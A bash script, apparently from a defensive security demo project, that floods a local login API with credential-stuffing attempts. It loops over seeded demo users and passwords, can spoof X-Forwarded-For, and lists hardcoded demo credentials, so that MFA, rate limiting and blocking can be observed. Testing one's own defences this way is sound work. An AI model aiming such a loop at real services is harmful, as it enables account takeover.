#!/usr/bin/env bash
# Hydra-style credential-stuffing demo against POST /api/v1/auth/login.
# Sends JSON logins *without* keystroke data so ML/rules flag missing_keystroke
# and seed users typically get mfa_required (not success).
#
# Prerequisites:
#   make up   (or stack reachable at TARGET)
#   uv run python scripts/seed_db.py   (seed demo1/demo2)
#
# Observe:
#   Mailhog MFA OTP  → http://localhost:8025
#   Admin audit log  → http://localhost:8000/admin/events  (admin / Admin123!)
#
# Simulated attacker IP: set ATTACK_IP and TRUST_PROXY_HEADERS=true in .env
# (X-Forwarded-For is ignored when TRUST_PROXY_HEADERS=false).

set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
if [[ -f "${ROOT}/.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "${ROOT}/.env"
  set +a
fi

TARGET="${TARGET:-http://localhost:8000}"
TARGET="${TARGET%/}"
USER_LIST="${USER_LIST:-demo1,demo2}"
ATTACK_IP="${ATTACK_IP:-203.0.113.99}"
SLEEP_SECS="${SLEEP_SECS:-0.2}"
MAX_ROUNDS="${MAX_ROUNDS:-0}" # 0 = run until Ctrl+C

SEED_PASS="${SEED_DEMO1_PASSWORD:-Demo123!}"
PASSWORDS="${PASSWORDS:-${SEED_PASS},wrong1,wrong2,wrong3}"

USE_XFF="${USE_XFF:-auto}" # auto | true | false

usage() {
  cat <<EOF
Usage: $(basename "$0") [options]

Environment:
  TARGET              Base URL (default: http://localhost:8000)
  USER_LIST           Comma-separated usernames (default: demo1,demo2)
  PASSWORDS           Comma-separated passwords (default: \$SEED_DEMO1_PASSWORD + wrong guesses)
  ATTACK_IP           Value for X-Forwarded-For (default: 203.0.113.99)
  USE_XFF             auto | true | false — send X-Forwarded-For header
  SLEEP_SECS          Delay between full user×password rounds (default: 0.2)
  MAX_ROUNDS          Stop after N rounds; 0 = infinite (default: 0)

Expected JSON status values:
  wrong password     → invalid_credentials (401)
  correct password   → mfa_required (200) without keystroke payload
  flood same IP      → rate_limited (429) after RATE_LIMIT_LOGIN_PER_MIN
  high risk block    → blocked (403)

Seed accounts only (local password). NYCU 9-digit users need /register first.
EOF
}

if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
  usage
  exit 0
fi

json_status() {
  local body="$1"
  if command -v jq >/dev/null 2>&1; then
    printf '%s' "$body" | jq -r '.status // "?"'
    return
  fi
  python3 -c 'import json,sys; print(json.load(sys.stdin).get("status","?"))' <<<"$body" 2>/dev/null || echo "?"
}

send_login() {
  local user="$1"
  local pass="$2"
  local headers=(-H "Content-Type: application/json")
  if [[ "$send_xff" == "true" ]]; then
    headers+=(-H "X-Forwarded-For: ${ATTACK_IP}")
  fi

  local body http_code
  body="$(
    curl -sS \
      -w "\n%{http_code}" \
      -X POST "${TARGET}/api/v1/auth/login" \
      "${headers[@]}" \
      -d "{\"username\":\"${user}\",\"password\":\"${pass}\"}" \
      2>/dev/null || true
  )"
  http_code="$(printf '%s' "$body" | tail -n 1)"
  body="$(printf '%s' "$body" | sed '$d')"

  local status ip_label
  status="$(json_status "$body")"
  if [[ "$send_xff" == "true" ]]; then
    ip_label="$ATTACK_IP"
  else
    ip_label="(client)"
  fi
  printf "%s user=%-8s http=%s status=%-20s ip=%s\n" \
    "$(date +%H:%M:%S)" "$user" "$http_code" "$status" "$ip_label"
}

send_xff="false"
case "$USE_XFF" in
  true) send_xff="true" ;;
  false) send_xff="false" ;;
  auto)
    if [[ "${TRUST_PROXY_HEADERS:-false}" == "true" ]]; then
      send_xff="true"
    else
      send_xff="false"
    fi
    ;;
  *)
    echo "Invalid USE_XFF=${USE_XFF} (use auto, true, or false)" >&2
    exit 1
    ;;
esac

echo "Active Defense — Hydra-style login flood"
echo "  target:    ${TARGET}/api/v1/auth/login"
echo "  users:     ${USER_LIST}"
echo "  passwords: ${PASSWORDS}"
echo "  xff:       ${send_xff} (ATTACK_IP=${ATTACK_IP})"
if [[ "$send_xff" == "false" && "$USE_XFF" == "auto" ]]; then
  echo "  note:      set TRUST_PROXY_HEADERS=true in .env to attribute floods to ATTACK_IP"
fi
echo "  sleep:     ${SLEEP_SECS}s between rounds"
echo "Press Ctrl+C to stop."
echo

round=0
while true; do
  round=$((round + 1))
  for user in ${USER_LIST//,/ }; do
    for pass in ${PASSWORDS//,/ }; do
      send_login "$user" "$pass"
    done
  done

  if [[ "$MAX_ROUNDS" -gt 0 && "$round" -ge "$MAX_ROUNDS" ]]; then
    echo
    echo "Completed ${MAX_ROUNDS} round(s)."
    break
  fi
  sleep "$SLEEP_SECS"
done
